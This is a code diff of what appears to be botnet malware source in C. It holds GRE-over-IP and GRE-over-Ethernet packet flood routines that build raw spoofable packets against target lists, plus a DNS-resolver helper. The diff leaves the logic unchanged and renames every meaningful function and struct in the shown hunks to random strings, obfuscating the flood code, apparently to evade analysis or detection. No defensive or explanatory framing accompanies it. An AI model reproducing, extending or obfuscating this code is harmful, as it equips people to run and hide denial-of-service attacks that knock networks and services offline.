@@ -820,7 +820,7 @@ void attack_method_udpdns(uint8_t targs_len, struct attack_target *targs, uint8_
 
 /* ===== greip ===== */
 
-void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void aP5Kp4u(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
     int i, fd;
     char **pkts;
@@ -834,18 +834,18 @@ void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t
     pkts = calloc(targs_len, sizeof(char *));
     if (!pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
-    source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, TRUE);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
+    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+    gcip = Cn6pZ7t(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
+    source_ip = Cn6pZ7t(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    fd = atk_open_raw(IPPROTO_TCP);
+    fd = _ES7Jr7U(IPPROTO_TCP);
     if (fd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -860,7 +860,7 @@ void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t
         greh = (struct grehdr *)(iph + 1);
         greiph = (struct iphdr *)(greh + 1);
         udph = (struct udphdr *)(greiph + 1);
-        atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_GRE,
+        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_GRE,
                      source_ip, targs[i].addr,
                      sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         greh->protocol = htons(ETH_P_IP);
@@ -927,7 +927,7 @@ void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t
 
 /* ===== greeth ===== */
 
-void attack_method_greeth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void yQ6Ut4X(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
     int i, fd;
     char **pkts;
@@ -941,18 +941,18 @@ void attack_method_greeth(uint8_t targs_len, struct attack_target *targs, uint8_
     pkts = calloc(targs_len, sizeof(char *));
     if (!pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
-    source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, TRUE);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
+    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+    gcip = Cn6pZ7t(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
+    source_ip = Cn6pZ7t(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    fd = atk_open_raw(IPPROTO_TCP);
+    fd = _ES7Jr7U(IPPROTO_TCP);
     if (fd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -969,7 +969,7 @@ void attack_method_greeth(uint8_t targs_len, struct attack_target *targs, uint8_
         ethh = (struct ethhdr *)(greh + 1);
         greiph = (struct iphdr *)(ethh + 1);
         udph = (struct udphdr *)(greiph + 1);
-        atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_GRE,
+        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_GRE,
                      source_ip, targs[i].addr,
                      sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         greh->protocol = htons(PROTO_GRE_TRANS_ETH);
@@ -1046,7 +1046,7 @@ void attack_method_greeth(uint8_t targs_len, struct attack_target *targs, uint8_
 
 /* ===== DNS resolver ===== */
 
-static ipv4_t get_dns_resolver(void)
+static ipv4_t _hU2VN8X(void)
 {
     /* Try /etc/resolv.conf first */
     int fd = open("/etc/resolv.conf", O_RDONLY);
